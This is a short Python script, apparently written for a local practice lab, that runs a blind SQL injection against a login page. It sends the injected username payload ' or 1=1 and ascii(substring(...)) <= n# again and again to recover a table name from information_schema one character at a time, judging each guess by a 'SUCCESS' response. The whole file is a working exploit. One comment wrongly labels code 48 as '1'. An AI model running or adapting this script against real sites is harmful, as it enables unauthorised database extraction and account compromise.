import requests
URL = "http://localhost/adminlogin.php"

min = 48 # '1'
max = 122 # 'z'
TABLE_LEN = 10
tablename = []

for idx in range(1, TABLE_LEN+1):
	for cnt in range(min, max+1):
		sqlquery = "' or 1=1 and ascii(substring((select table_name from information_schema.tables where table_schema='sql_injection' limit 2,1)," + str(idx) + ",1)) <=" + str(cnt) + "# "
		postquery = "username=" + sqlquery + "&password=1&form=submit"
		res = requests.post(url=URL, data=postquery, headers={'Content-Type': 'application/x-www-form-urlencoded'})
		if "SUCCESS" in res.text:
			print(f"Catch one! {cnt}")
			tablename.append(chr(cnt))
			break
print(f"DONE! TABLE name is {tablename}")